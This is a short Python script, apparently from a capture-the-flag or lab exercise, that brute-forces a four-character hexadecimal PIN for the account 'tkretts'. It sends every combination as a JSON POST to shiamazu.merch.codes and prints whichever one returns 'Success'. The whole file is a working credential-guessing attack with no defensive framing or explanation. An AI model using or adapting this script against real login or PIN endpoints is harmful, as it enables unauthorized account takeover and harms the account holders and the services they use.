#!/usr/bin/python3

import itertools, requests,  sys

def force(combinations):
    for c in combinations:
        tmp_str = "".join(c)
        data = {
        "function":"verify",
        "username":"tkretts",
        "pin":tmp_str
        }
        try:
            resp = requests.post("http://shiamazu.merch.codes/",json=data,timeout=2)
            if "Success" in resp.text:
                print(tmp_str)
        except:
            print("error")
        

if __name__ == "__main__":
    chars = "0123456789ABCDEF"
    combinations = itertools.product(chars,repeat=4)
    force(combinations)
